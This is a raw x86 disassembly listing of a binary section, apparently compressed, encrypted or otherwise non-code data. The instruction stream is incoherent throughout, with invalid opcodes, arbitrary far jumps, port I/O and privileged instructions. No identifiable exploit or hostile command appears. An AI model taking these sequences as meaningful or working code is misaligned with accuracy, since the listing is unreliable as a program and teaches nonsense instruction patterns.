  412b5a:	rcl    DWORD PTR [ebx-0x28c2fdd1],0x8c
  412b61:	gs cs push es
  412b64:	mov    eax,0x26cc9e0a
  412b69:	rcl    BYTE PTR [ebx-0x21],0x80
  412b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b6e:	jmp    0x8f8b:0xcbe5bc01
  412b75:	fadd   QWORD PTR [ebp+0x3b]
  412b78:	loope  0x412afd
  412b7a:	inc    esi
  412b7b:	xor    DWORD PTR [edx],esp
  412b7d:	jnp    0x412bc5
  412b7f:	cs push ss
  412b81:	das    
  412b82:	lock or al,0xd2
  412b85:	or     al,0x13
  412b87:	pop    ss
  412b88:	out    dx,eax
  412b89:	lds    esi,FWORD PTR [ecx]
  412b8b:	sar    BYTE PTR [edi-0x22934245],1
  412b91:	mov    ch,0x83
  412b93:	cmp    al,0x4c
  412b95:	loop   0x412b34
  412b97:	test   DWORD PTR [esi+0x66],0xe4d6235c
  412b9e:	xchg   ebx,eax
  412b9f:	xchg   ebx,eax
  412ba0:	jmp    0xf5c1257a
  412ba5:	retf   
  412ba6:	add    eax,0x1c4bfca7
  412bab:	cmp    DWORD PTR [ebx+0x1902ba2f],ebx
  412bb1:	loope  0x412bbe
  412bb3:	pusha  
  412bb4:	mov    edi,0xd2528404
  412bb9:	in     eax,0x51
  412bbb:	jmp    0x7435:0x9e89606f
  412bc2:	mov    eax,0xab983f87
  412bc7:	dec    esp
  412bc8:	aas    
  412bc9:	inc    bh
  412bcb:	aad    0xd2
  412bcd:	jnp    0x412bb7
  412bcf:	jbe    0x412c2d
  412bd1:	dec    esi
  412bd2:	out    0x22,al
  412bd4:	fwait
  412bd5:	ret    
  412bd6:	inc    ecx
  412bd7:	push   ss
  412bd8:	jmp    0x412bbf
  412bda:	dec    eax
  412bdb:	push   ecx
  412bdc:	mov    al,0x70
  412bde:	cdq    
  412bdf:	test   BYTE PTR [ebp-0x66],0xbd
  412be3:	sub    eax,0x905c636f
  412be8:	popa   
  412be9:	test   esi,eax
  412beb:	jns    0x412bfb
  412bed:	mov    ch,0x22
  412bef:	and    dl,BYTE PTR [edi+0x20]
  412bf2:	cmp    eax,0xe5bb1832
  412bf7:	xchg   ecx,eax
  412bf8:	inc    edi
  412bf9:	dec    edx
  412bfa:	ds retf 0xf90b
  412bfe:	scas   eax,DWORD PTR es:[edi]
  412bff:	enter  0xb5c3,0xe5
  412c03:	add    esp,0x84971157
  412c09:	sti    
  412c0a:	pop    esp
  412c0b:	call   0xe16b377e
  412c10:	cmp    DWORD PTR [eax+0x7b],esi
  412c13:	ja     0x412c8b
  412c15:	cmp    bl,BYTE PTR [ebx-0x40]
  412c18:	in     eax,0x77
  412c1a:	pop    ds
  412c1b:	out    0xeb,eax
  412c1d:	int    0xa6
  412c1f:	pusha  
  412c20:	cmc    
  412c21:	lods   al,BYTE PTR ds:[esi]
  412c22:	popf   
  412c23:	mov    cl,0x60
  412c25:	xor    BYTE PTR [esi],0xa4
  412c28:	out    dx,eax
  412c29:	clc    
  412c2a:	dec    ebp
  412c2b:	dec    esp
  412c2c:	adc    eax,0xaf4831fa
  412c31:	or     ebx,DWORD PTR [edi]
  412c33:	add    esp,DWORD PTR [ecx-0x3937102f]
  412c39:	pop    es
  412c3a:	mov    dh,0x87
  412c3c:	or     al,0xb9
  412c3e:	das    
  412c3f:	ret    0xfcfa
  412c42:	push   ebx
  412c43:	out    0x7,al
  412c45:	jp     0x412be8
  412c47:	rcr    DWORD PTR [ebp+edx*4-0xbaeb8dd],cl
  412c4e:	push   es
  412c4f:	aad    0x1c
  412c51:	mov    dl,0x2f
  412c53:	adc    BYTE PTR [edi-0x6b5fcae9],bh
  412c59:	xchg   esp,eax
  412c5a:	mov    BYTE PTR [ebx+0x1c],bh
  412c5d:	mov    cs,ebp
  412c5f:	aas    
  412c60:	xchg   ebx,eax
  412c61:	push   ebp
  412c62:	mov    ecx,edx
  412c64:	cdq    
  412c65:	push   ebx
  412c66:	sbb    eax,0x4342ea3
  412c6b:	add    al,cl
  412c6d:	(bad)  
  412c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c6f:	or     DWORD PTR [eax+0x50fc6aaa],0x69
  412c76:	cwde   
  412c77:	ds dec esi
  412c79:	dec    esp
  412c7a:	sub    edi,DWORD PTR [esi-0x4ed50789]
  412c80:	les    edx,FWORD PTR [ebp-0x2]
  412c83:	test   DWORD PTR [esi+0x50abd539],ecx
  412c89:	pop    ebx
  412c8a:	rcr    DWORD PTR [eax],cl
  412c8c:	push   ebp
  412c8d:	pop    ds
  412c8e:	fiadd  DWORD PTR [ecx+0x3f]
  412c91:	mov    esp,0x21a2e893
  412c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c97:	mov    ch,0xc0
  412c99:	and    BYTE PTR [ebx-0xf],0x4d
  412c9d:	xor    esp,DWORD PTR [edx]
  412c9f:	pop    eax
  412ca0:	fsub   QWORD PTR [esi+0x2c7cf9e9]
  412ca6:	test   al,0x39
  412ca8:	pop    esi
  412ca9:	jmp    0x74f7c9e2
  412cae:	mov    cl,0xff
  412cb0:	xor    ah,dh
  412cb2:	(bad)  
  412cb4:	loop   0x412d0b
  412cb6:	sub    eax,0x6d82bdc8
  412cbb:	ds push esp
  412cbd:	add    eax,0x5663494d
  412cc2:	sub    al,0x22
  412cc4:	bound  eax,QWORD PTR [edi+edx*1-0x51]
  412cc8:	mov    esp,0x348cad6e
  412ccd:	xchg   edi,esi
  412ccf:	xor    BYTE PTR [ebx+0x954cc09],bh
  412cd5:	or     al,0xc5
  412cd7:	pop    es
  412cd8:	xor    al,0xab
  412cda:	ret    0x6543
  412cdd:	das    
  412cde:	or     eax,0xc47b5c54
  412ce3:	call   0x4cfd:0x5f433266
  412cea:	aas    
  412ceb:	iret   
  412cec:	cmc    
  412ced:	sub    bl,BYTE PTR [edx+esi*8]
  412cf0:	and    eax,0xc4ea3ba9
  412cf5:	jae    0x412c83
  412cf7:	(bad)  
  412cf9:	inc    edi
  412cfa:	jecxz  0x412cec
  412cfc:	pop    ds
  412cfd:	jns    0x412d45
  412cff:	mov    ecx,0x592a4e0b
  412d04:	pusha  
  412d05:	repz jl 0x412ccd
  412d08:	adc    dh,ch
  412d0a:	mov    cl,0xf9
  412d0c:	pushf  
  412d0d:	push   0xfffffff8
  412d0f:	fidiv  WORD PTR [eax+0x19ffe72b]
  412d15:	neg    BYTE PTR [esi-0x5c0e9e43]
  412d1b:	lahf   
  412d1c:	lahf   
  412d1d:	cmp    BYTE PTR ds:0x26e3647e,ah
  412d23:	mov    esi,esi
  412d25:	loop   0x412d45
  412d27:	pop    esp
  412d28:	popf   
  412d29:	add    edx,eax
  412d2b:	and    BYTE PTR ds:0x23e885c8,al
  412d31:	fisub  DWORD PTR [ecx+ecx*4+0x31]
  412d35:	aad    0xa7
  412d37:	push   ds
  412d38:	aad    0xe5
  412d3a:	pop    es
  412d3b:	ss es aas 
  412d3e:	arpl   WORD PTR [edx],si
  412d40:	ins    DWORD PTR es:[edi],dx
  412d41:	mov    gs,WORD PTR [esi]
  412d43:	and    BYTE PTR [esi+edx*1-0x3f663ab],0xbc
  412d4b:	je     0x412cea
  412d4d:	add    BYTE PTR [ecx+0x2c],ch
  412d50:	cmp    al,0x38
  412d52:	clc    
  412d53:	fsub   DWORD PTR [edi]
  412d55:	pop    ecx
  412d56:	xor    DWORD PTR [ebx+0x6e],esp
  412d59:	(bad)  
  412d5b:	dec    edx
  412d5c:	sub    esi,edi
  412d5e:	sbb    al,BYTE PTR [esi-0x2045b20]
  412d64:	aad    0x7f
  412d66:	jmp    FWORD PTR [ebp-0x7b48834a]
  412d6c:	rcr    dl,cl
  412d6e:	lods   al,BYTE PTR ds:[esi]
  412d6f:	mov    eax,0xa9f013dd
  412d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d75:	(bad)  
  412d76:	adc    DWORD PTR [ecx],eax
  412d78:	push   ecx
  412d79:	mov    al,ds:0xb833278c
  412d7e:	cmp    eax,0xccb3437a
  412d83:	mov    dh,0x74
  412d85:	enter  0xd74a,0xff
  412d89:	mov    ebp,0x2e37f03b
  412d8e:	mul    BYTE PTR [ebp+0x77]
  412d91:	mov    ecx,0x19a7d7ac
  412d96:	and    eax,esp
  412d98:	xchg   ecx,eax
  412d99:	aaa    
  412d9a:	push   edi
  412d9b:	icebp  
  412d9c:	mov    cl,0xff
  412d9e:	fs pop es
  412da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da1:	push   esp
  412da2:	add    al,0xa9
  412da4:	sub    DWORD PTR [ebp-0x2d0f4591],esi
  412daa:	lea    ebx,[edx-0x3b]
  412dad:	cmp    dl,BYTE PTR [edx+edi*8-0x5b4d59a9]
  412db4:	hlt    
  412db5:	ficomp DWORD PTR [ebx]
  412db7:	fidivr DWORD PTR [eax]
  412db9:	inc    edx
  412dba:	add    DWORD PTR [edi*4+0x6091c88f],esp
  412dc1:	arpl   dx,dx
  412dc3:	out    dx,al
  412dc4:	es push edi
  412dc6:	cmp    DWORD PTR [ebp+eax*1-0x26],edx
  412dca:	add    BYTE PTR [ecx-0x566b895f],cl
  412dd0:	mov    bh,0x73
  412dd2:	cmp    eax,0xfd85aeae
  412dd7:	pop    esi
  412dd8:	leave  
  412dd9:	xchg   BYTE PTR [esi],al
  412ddb:	lods   al,BYTE PTR ds:[esi]
  412ddc:	push   ds
  412ddd:	out    dx,eax
  412dde:	sti    
  412ddf:	(bad)  
  412de0:	adc    DWORD PTR [eax-0x7e],edx
  412de3:	mov    ah,0x97
  412de5:	sub    al,0xb4
  412de7:	sbb    al,0xcc
  412de9:	imul   edx,DWORD PTR [esi+0x1d0ead72],0x17
  412df0:	xchg   ebx,eax
  412df1:	pop    eax
  412df2:	jmp    0x8ed:0xd0f6bd06
  412df9:	sub    cl,BYTE PTR [eax-0x23]
  412dfc:	lock (bad) 
  412dfe:	ins    DWORD PTR es:[edi],dx
  412dff:	arpl   bx,bp
  412e01:	pushf  
  412e02:	hlt    
  412e03:	dec    esp
  412e04:	inc    esp
  412e05:	jle    0x412db0
  412e07:	jno    0x412dd6
  412e09:	inc    ecx
  412e0a:	lods   eax,DWORD PTR ds:[esi]
  412e0b:	cli    
  412e0c:	fst    st(0)
  412e0e:	bound  ebx,QWORD PTR gs:[esi]
  412e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e12:	xchg   edx,eax
  412e13:	sub    DWORD PTR [edx],ebx
  412e15:	(bad)
  412e1a:	pop    edx
  412e1b:	cld    
  412e1c:	leave  
  412e1d:	pop    ds
  412e1e:	les    esi,FWORD PTR [edx+ecx*4]
  412e21:	loop   0x412db9
  412e23:	dec    esp
  412e24:	les    esi,FWORD PTR [ebx]
  412e26:	imul   ebx,DWORD PTR [esp+esi*4+0x47],0x7e
  412e2b:	pop    esi
  412e2c:	lds    edi,FWORD PTR [ebx]
  412e2e:	sbb    BYTE PTR [edi+0x2d8e59df],0x63
  412e35:	jmp    0x412e76
  412e37:	enter  0xba92,0x9f
  412e3b:	mov    ds:0xaec5a190,eax
  412e40:	ret    0x9717
  412e43:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e45:	aaa    
  412e46:	mov    ah,0xf6
  412e48:	lea    ebx,[edi-0x3e]
  412e4b:	ret    
  412e4c:	mov    eax,0xeaae3cb5
  412e51:	adc    al,0x85
  412e53:	lods   al,BYTE PTR ds:[esi]
  412e54:	jae    0x412eca
  412e56:	sub    edx,ebx
  412e58:	jo     0x412e7b
  412e5a:	mov    dl,0x30
  412e5c:	cdq    
  412e5d:	out    dx,eax
  412e5e:	mov    edx,0xb4c6c448
  412e63:	push   esi
  412e64:	push   ss
  412e65:	add    ebx,DWORD PTR [esi-0x3a]
  412e68:	fidiv  WORD PTR [ebx-0x20e0b5a8]
  412e6e:	outs   dx,DWORD PTR ds:[esi]
  412e6f:	ins    BYTE PTR es:[edi],dx
  412e70:	pslld  mm2,QWORD PTR [edx]
  412e73:	neg    esi
  412e75:	fucomi st,st(2)
  412e77:	shl    DWORD PTR [esi+esi*1],0x11
  412e7b:	sahf   
  412e7c:	pop    es
  412e7d:	in     al,dx
  412e7e:	xor    dl,al
  412e80:	fstp   st(1)
  412e82:	adc    edx,DWORD PTR [ebx+0x7e7957b]
  412e88:	jns    0x412e7f
  412e8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e8b:	or     eax,DWORD PTR [esi-0x10]
  412e8e:	shl    ebp,cl
  412e90:	push   es
  412e91:	nop
  412e92:	int3   
  412e93:	adc    al,0xea
  412e95:	xor    DWORD PTR [edi+0x44e38d90],edi
  412e9b:	push   esi
  412e9c:	mov    gs,edi
  412e9e:	call   0xc3b1:0xc0e343a0
  412ea5:	dec    esp
  412ea6:	mov    dh,0x53
  412ea8:	adc    edi,ebx
  412eaa:	out    dx,eax
  412eab:	mov    ah,0x72
  412ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eae:	add    ebp,DWORD PTR [ebx+edi*2+0x142dd6b8]
  412eb5:	out    0x1a,eax
  412eb7:	out    0xb,al
  412eb9:	dec    ebp
  412eba:	inc    ebp
  412ebb:	cdq    
  412ebc:	stos   BYTE PTR es:[edi],al
  412ebd:	retf   0x5653
  412ec0:	adc    al,0x55
  412ec2:	sub    dl,ah
  412ec4:	(bad)  
  412ec5:	sub    DWORD PTR [edi-0x24],ecx
  412ec8:	mov    BYTE PTR [eax],bl
  412eca:	ins    DWORD PTR es:[edi],dx
  412ecb:	inc    ecx
  412ecc:	and    eax,0x10b647cb
  412ed1:	push   0x5bcb5fab
  412ed6:	shl    DWORD PTR [eax-0x52d324c4],1
  412edc:	xor    al,0xa5
  412ede:	sbb    al,0xb0
  412ee0:	sub    al,0x21
  412ee2:	dec    eax
  412ee3:	xlat   BYTE PTR ds:[ebx]
  412ee4:	loope  0x412ed0
  412ee6:	icebp  
  412ee7:	pusha  
  412ee8:	xor    ebp,DWORD PTR [ecx-0x45]
  412eeb:	jo     0x412f2a
  412eed:	push   edi
  412eee:	push   eax
  412eef:	mov    ecx,0x2958201f
  412ef4:	sub    BYTE PTR [esi],dh
  412ef6:	(bad)  
  412ef7:	jmp    0xfa8c849f
  412efc:	jp     0x412eee
  412efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eff:	dec    ecx
  412f00:	adc    al,0x7
  412f02:	xor    eax,DWORD PTR [edi+esi*2+0x463dfdaa]
  412f09:	nop
  412f0a:	lahf   
  412f0b:	mov    bl,0x61
  412f0d:	add    ecx,esi
  412f0f:	dec    edx
  412f10:	xor    BYTE PTR [edi],bl
  412f12:	sub    eax,0xd737a7e8
  412f17:	test   al,0x8
  412f19:	inc    DWORD PTR [edx+0x4075acfc]
  412f1f:	pop    DWORD PTR [eax+0x6a]
  412f22:	dec    ecx
  412f23:	inc    ebx
  412f24:	xor    al,0x94
  412f26:	xchg   ebx,eax
  412f27:	push   es
  412f28:	dec    esi
  412f29:	into   
  412f2a:	js     0x412efb
  412f2c:	mov    edx,0xa56a06a9
  412f31:	sub    BYTE PTR [edi-0x3f36f46d],dh
  412f37:	imul   ebp,DWORD PTR [edx],0x5
  412f3a:	mov    DWORD PTR [edi+0x7748b1cd],eax
  412f40:	xchg   al,ch
  412f42:	xor    ah,ah
  412f44:	cwde   
  412f45:	xchg   ecx,eax
  412f46:	push   ebp
  412f47:	or     edx,DWORD PTR [ebx]
  412f49:	mov    esp,0x437bb677
  412f4e:	mov    ebx,0x74a0f33
  412f53:	push   cs
  412f54:	and    DWORD PTR [ecx-0x1525181d],ebx
  412f5a:	mov    cl,0x9b
  412f5c:	mov    ch,0x2
  412f5e:	mov    al,0xa2
  412f60:	add    dh,BYTE PTR [edi+0x2b]
  412f63:	xchg   ecx,eax
  412f64:	xor    DWORD PTR [eax+0x30],0x68
  412f68:	(bad)  
  412f69:	aas    
  412f6a:	dec    ebx
  412f6b:	mov    esi,0xb55353e1
  412f70:	shl    DWORD PTR [edi],1
  412f72:	cmp    DWORD PTR [edi-0x1ec1973b],0x63
  412f79:	les    ebp,FWORD PTR [ebx+edi*8-0x6a]
  412f7d:	sbb    esi,DWORD PTR [edx+eiz*2]
  412f80:	jo     0x412fbe
  412f82:	mov    bh,0x28
  412f84:	push   ebx
  412f85:	add    ch,BYTE PTR [ebx]
  412f87:	hlt    
  412f88:	lds    ebp,FWORD PTR ds:0x25e99ca
  412f8e:	outs   dx,BYTE PTR ds:[esi]
  412f8f:	dec    ecx
  412f90:	fst    DWORD PTR [esp+eax*4]
  412f93:	adc    DWORD PTR [esi+0x5148fa05],ebx
  412f99:	jnp    0x412f7d
  412f9b:	int    0x60
  412f9d:	scas   eax,DWORD PTR es:[edi]
  412f9e:	and    al,BYTE PTR [ecx-0x47]
  412fa1:	pop    es
  412fa2:	and    ah,al
  412fa4:	push   edi
  412fa5:	mov    ebx,0x27e28b1d
  412faa:	jg     0x412fb7
  412fac:	push   ss
  412fad:	retf   
  412fae:	adc    eax,DWORD PTR [ecx]
  412fb0:	jns    0x412fd1
  412fb2:	inc    edi
  412fb3:	rcr    BYTE PTR [ecx+0x47],0xa6
  412fb7:	xchg   BYTE PTR [eax+0x49],dh
  412fba:	(bad)  
  412fbb:	imul   esi,DWORD PTR [ebx+0x1804da00],0xffffffb1
  412fc2:	add    DWORD PTR [ebp-0x67],edx
  412fc5:	pop    ebx
  412fc6:	fbstp  TBYTE PTR [esi-0x7061dbe9]
  412fcc:	in     al,dx
  412fcd:	inc    edi
  412fce:	xchg   esp,eax
  412fcf:	sub    ebp,DWORD PTR [edi+ebp*2+0x6fb66a6d]
  412fd6:	dec    ebx
  412fd7:	add    DWORD PTR [esi],ebp
  412fd9:	imul   edx,DWORD PTR [ebx],0xffffffbe
  412fdc:	inc    BYTE PTR ds:0xdfd67d5a
  412fe2:	mov    ebp,0x4083cc63
  412fe7:	ss xchg ebp,eax
  412fe9:	cli    
  412fea:	in     al,0xd9
  412fec:	mov    ebx,0x7ae0e5b5
  412ff1:	sbb    DWORD PTR [edx+0x36],ecx
  412ff4:	std    
  412ff5:	aam    0x20
  412ff7:	imul   ebp,eax,0xd2048c04
  412ffd:	add    ebx,DWORD PTR [edi+ebp*8]
  413000:	out    0x73,al
  413002:	jnp    0x412feb
  413004:	pop    edx
  413005:	or     cl,0xc4
  413008:	inc    edx
  413009:	lds    edx,FWORD PTR [edx]
  41300b:	setnp  BYTE PTR [ebp-0x4e687845]
  413012:	mov    dl,0x62
  413014:	ss mov bl,0x62
  413017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413018:	mov    eax,ds:0x2218a092
  41301d:	ror    ch,0x87
  413020:	mov    dh,0xe7
  413022:	add    DWORD PTR [eax+0x51],edx
  413025:	in     al,0x21
  413027:	cmp    al,0xde
  413029:	jmp    0xfdaa:0x728b0d8a
  413030:	inc    eax
  413031:	in     eax,dx
  413032:	lods   al,BYTE PTR ds:[esi]
  413033:	xchg   edx,eax
  413034:	shl    BYTE PTR [esi-0x78],1
  413037:	adc    ch,BYTE PTR [eax-0x1c6fa217]
  41303d:	(bad)  
  41303e:	mov    esp,0x6e299a56
  413043:	or     al,BYTE PTR [ebx+eiz*1+0x16]
  413047:	add    ecx,esi
  413049:	pusha  
  41304a:	ret    0xa737
  41304d:	mov    ebp,0x24394bf
  413052:	scas   eax,DWORD PTR es:[edi]
  413053:	or     al,BYTE PTR [ecx+0x7133faa1]
  413059:	xchg   ebp,eax
  41305a:	jmp    0x5c7c776
  41305f:	sti    
  413060:	js     0x41300c
  413062:	sub    BYTE PTR [ebx-0x72],0xa
  413066:	js     0x413040
  413068:	test   eax,0xc4c8e45a
  41306d:	jle    0x413070
  41306f:	inc    ebp
  413070:	jecxz  0x413009
  413072:	sub    al,0x35
  413074:	xchg   BYTE PTR [ebp-0x7cf09d6e],al
  41307a:	adc    ebp,DWORD PTR [ebp-0x71]
  41307d:	cmp    ch,dl
  41307f:	test   DWORD PTR [ecx-0x26629371],edx
  413085:	call   0x3905:0xd5bb1653
  41308c:	(bad)  
  41308d:	push   esi
  41308e:	and    DWORD PTR [esi-0x45],edi
  413091:	aas    
  413092:	fisubr WORD PTR [ebx+0x39]
  413095:	aaa    
  413096:	lds    esi,FWORD PTR [eax]
  413098:	mov    edx,edi
  41309a:	mov    esp,0x40bbd39d
  41309f:	xor    al,0xf4
  4130a1:	inc    esi
  4130a2:	xor    ah,ch
  4130a4:	jmp    0x34f7:0xdf044fc1
  4130ab:	push   ds
  4130ac:	mov    bh,0xd9
  4130ae:	and    BYTE PTR [eax+0x7e2661f9],bh
  4130b4:	push   esp
  4130b5:	nop
  4130b6:	lds    edi,FWORD PTR [ebx+edx*8]
  4130b9:	push   cs
  4130ba:	scas   eax,DWORD PTR es:[edi]
  4130bb:	xchg   ecx,eax
  4130bc:	repnz inc eax
  4130be:	das    
  4130bf:	(bad)  
  4130c0:	xlat   BYTE PTR ds:[ebx]
  4130c1:	(bad)  
  4130c3:	mov    ch,0xea
  4130c5:	stos   DWORD PTR es:[edi],eax
  4130c6:	add    DWORD PTR [ebx-0xb44926b],edi
  4130cc:	or     DWORD PTR [eax-0x368be42e],ecx
  4130d2:	(bad)  
  4130d3:	jl     0x413113
  4130d5:	mov    al,0xc2
  4130d7:	jge    0x413132
  4130d9:	dec    eax
  4130da:	das    
  4130db:	push   ebp
  4130dc:	hlt    
  4130dd:	mov    ecx,0x21277f3
  4130e2:	xor    al,0x42
  4130e4:	out    0x61,eax
  4130e6:	adc    DWORD PTR [esi],ebx
  4130e8:	mov    eax,0xe6e35823
  4130ed:	cmp    DWORD PTR [esi],edi
  4130ef:	out    dx,eax
  4130f0:	mov    DWORD PTR [ebx+ebx*8-0x3d],ebp
  4130f4:	mov    BYTE PTR [edx],ch
  4130f6:	(bad)  
  4130f7:	(bad)  
  4130f8:	and    BYTE PTR [esi-0x4b],ch
  4130fb:	dec    ebx
  4130fc:	xchg   esi,eax
  4130fd:	mov    esp,?
  4130ff:	pop    es
  413100:	loop   0x41315a
  413102:	aas    
  413103:	pop    ss
  413104:	rol    DWORD PTR [ebp+0x4a7c81a3],0x81
  41310b:	clc    
  41310c:	test   eax,0x6653bc3
  413111:	cmp    al,0x1f
  413113:	jns    0x4130b8
  413115:	retf   
  413116:	and    eax,0x6fad0f15
  41311b:	mov    ah,0xcd
  41311d:	jp     0x4130af
  41311f:	mov    esp,0xc92d52aa
  413124:	xor    DWORD PTR [edi+0x6ecce104],0xffffffd5
  41312b:	push   eax
  41312c:	fyl2xp1 
  41312e:	and    eax,0xff9d3e52
  413133:	int    0xd1
  413135:	popf   
  413136:	out    0x83,al
  413138:	cld    
  413139:	cli    
  41313a:	(bad)  
  41313b:	loopne 0x4130d7
  41313d:	fldenv [ebp+0x4c98ac2f]
  413143:	xchg   ebp,eax
  413144:	rol    ah,cl
  413146:	xlat   BYTE PTR ds:[ebx]
  413147:	jp     0x413176
  413149:	dec    ecx
  41314a:	mov    esp,0x988e6f50
  41314f:	je     0x413121
  413151:	dec    esi
  413152:	push   edx
  413153:	shr    ebp,0x6
  413156:	fwait
  413157:	mov    dl,0x3e
  413159:	xchg   ebp,eax
  41315a:	sub    ecx,DWORD PTR [esi]
  41315c:	aas    
  41315d:	std    
  41315e:	mov    WORD PTR [esi+0x54d57065],?
  413164:	xchg   BYTE PTR [ebx],cl
  413166:	std    
  413167:	mov    ecx,0xb06d89cf
  41316c:	ficomp WORD PTR [eax]
  41316e:	jmp    0xe4acfa5c
  413173:	push   ss
  413174:	dec    edi
  413175:	mov    ecx,0x90597528
  41317a:	jl     0x413130
  41317c:	(bad)  
  41317d:	int    0x89
  41317f:	pop    ds
  413180:	jp     0x413179
  413182:	enter  0xcee8,0x92
  413186:	(bad)  
  413187:	push   ss
  413188:	cmp    ah,BYTE PTR [ebp+ebx*1-0x5]
  41318c:	sbb    BYTE PTR [eax-0x609162f6],dl
  413192:	push   0x46
  413194:	lods   al,BYTE PTR ds:[esi]
  413195:	mov    BYTE PTR [ebx],bh
  413197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413198:	mov    DWORD PTR [edi],esi
  41319a:	xor    esp,ecx
  41319c:	sti    
  41319d:	sbb    ch,BYTE PTR [ebx+ebx*8-0x6a]
  4131a1:	mov    DWORD PTR [ecx],edx
  4131a3:	xchg   ecx,eax
  4131a4:	add    BYTE PTR [eax-0x49],cl
  4131a7:	loope  0x413142
  4131a9:	iret   
  4131aa:	xchg   ecx,eax
  4131ab:	sbb    al,0x91
  4131ad:	loop   0x41314e
  4131af:	mov    ebx,DWORD PTR [esi]
  4131b1:	jecxz  0x41322b
  4131b3:	cmp    DWORD PTR [edx+0x37],edx
  4131b6:	pop    es
  4131b7:	xchg   BYTE PTR [ebx-0x64],dh
  4131ba:	fs sahf 
  4131bc:	das    
  4131bd:	xchg   edi,eax
  4131be:	clc    
  4131bf:	scas   al,BYTE PTR es:[edi]
  4131c0:	clc    
  4131c1:	(bad)  
  4131c3:	stc    
  4131c4:	or     dh,BYTE PTR [esi-0x1e26f54f]
  4131ca:	add    BYTE PTR [esp+eiz*4-0x29],al
  4131ce:	adc    eax,0x9e35de6c
  4131d3:	xchg   ebx,eax
  4131d4:	dec    eax
  4131d5:	push   esp
  4131d6:	test   ah,bh
  4131d8:	lea    esi,[edi-0x64]
  4131db:	add    edi,DWORD PTR [eax+edx*2+0x710a748d]
  4131e2:	and    al,0xd0
  4131e4:	sub    bl,dh
  4131e6:	jns    0x413235
  4131e8:	pushf  
  4131e9:	vminps xmm0,xmm6,XMMWORD PTR [esi+0x31]
  4131ee:	les    edi,FWORD PTR [ebx-0x3dd29992]
  4131f4:	leave  
  4131f5:	ins    DWORD PTR es:[edi],dx
  4131f6:	or     al,0x7f
  4131f8:	and    cl,ch
  4131fa:	sti    
  4131fb:	outs   dx,BYTE PTR ds:[esi]
  4131fc:	adc    esi,esp
  4131fe:	xor    bl,ch
  413200:	test   DWORD PTR [edx-0x1d],ebx
  413203:	inc    esi
  413204:	add    al,0x2b
  413206:	cmp    al,0xc6
  413208:	mov    ds:0xc92f07e3,eax
  41320d:	xchg   ebx,eax
  41320e:	mov    ds:0x1eafc6f5,al
  413213:	arpl   ax,cx
  413215:	mov    ?,WORD PTR [esi+0x2ea9f4b3]
  41321b:	icebp  
  41321c:	inc    esp
  41321d:	std    
  41321e:	jne    0x41320d
  413220:	xor    ah,ah
  413222:	xor    al,0x8e
  413224:	inc    esi
  413225:	pop    ss
  413226:	xor    bh,BYTE PTR [edi+eiz*4-0x285c4aa4]
  41322d:	mov    ah,0x51
  41322f:	jmp    0x6951b463
  413234:	fbld   TBYTE PTR [ebp-0x28]
  413237:	and    eax,DWORD PTR [edx]
  413239:	jmp    0xb3b:0x4bed3ad8
  413240:	push   ebx
  413241:	(bad)  [ecx]
  413243:	and    eax,0x4fd722d
  413248:	loopne 0x4132c8
  41324a:	dec    edi
  41324b:	inc    esi
  41324c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41324d:	push   ds
  41324e:	add    ch,0x4
  413251:	adc    al,0x97
  413253:	push   edx
  413254:	xor    eax,0xd4bead2a
  413259:	mov    ds:0x46491110,al
  41325e:	aas    
  41325f:	gs pop esp
  413261:	retf   0x32e3
  413264:	pop    edx
  413265:	mov    es,esp
  413267:	popf   
  413268:	out    0xf5,al
  41326a:	pop    ss
  41326b:	mov    ds:0x6b5f78f6,eax
  413270:	in     eax,0xa4
  413272:	mov    ah,BYTE PTR [ebx+0x73c83d36]
  413278:	cmp    dh,BYTE PTR [esi]
  41327a:	jmp    0x3d55:0xcd9c730
  413281:	popf   
  413282:	in     al,dx
  413283:	inc    ecx
  413284:	fdivr  QWORD PTR [ecx-0x3b9deb83]
  41328a:	stos   DWORD PTR es:[edi],eax
  41328b:	mov    ds:0xe92605a6,eax
  413290:	out    0x56,al
  413292:	ja     0x4132db
  413294:	push   eax
  413295:	mov    eax,ss
  413297:	out    dx,eax
  413298:	push   ebp
  413299:	dec    eax
  41329a:	sbb    esi,edx
  41329c:	rol    al,cl
  41329e:	das    
  41329f:	mov    cl,0x77
  4132a1:	mov    dh,0x8f
  4132a3:	dec    edi
  4132a4:	push   0x31d1fe9a
  4132a9:	cld    
  4132aa:	test   eax,0xf526c3a2
  4132af:	jl     0x4132e6
  4132b1:	xchg   ebx,eax
  4132b2:	retf   
  4132b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132b4:	xor    BYTE PTR [eax-0x6c],al
  4132b7:	mov    al,ds:0xf17812c6
  4132bc:	mov    bl,0x2b
  4132be:	pushf  
  4132bf:	ja     0x413322
  4132c1:	jge    0x413333
  4132c3:	mov    al,ds:0xe5dc9ff7
  4132c8:	lock mov edi,0x2fcb7cca
  4132ce:	xor    edi,edi
  4132d0:	xchg   esp,eax
  4132d1:	pop    ebx
  4132d2:	loope  0x4132dd
  4132d4:	xchg   ebp,eax
  4132d5:	or     al,0x5c
  4132d7:	enter  0xe3ce,0x41
  4132db:	adc    al,0xc9
  4132dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132de:	lock mov ebp,0xf78c08f1
  4132e4:	out    0x9a,al
  4132e6:	sub    edi,DWORD PTR [edx-0x79]
  4132e9:	mov    dh,0x79
  4132eb:	add    BYTE PTR [edi],bh
  4132ed:	mov    ebx,0xd9814733
  4132f2:	mov    edi,DWORD PTR [ebx+0x515fd541]
  4132f8:	mov    esi,0xfeef555b
  4132fd:	sbb    dh,dl
  4132ff:	test   BYTE PTR [ebx+0x39460e2d],0xc
  413306:	call   0x1fe507b1
  41330b:	mov    esi,0x545db954
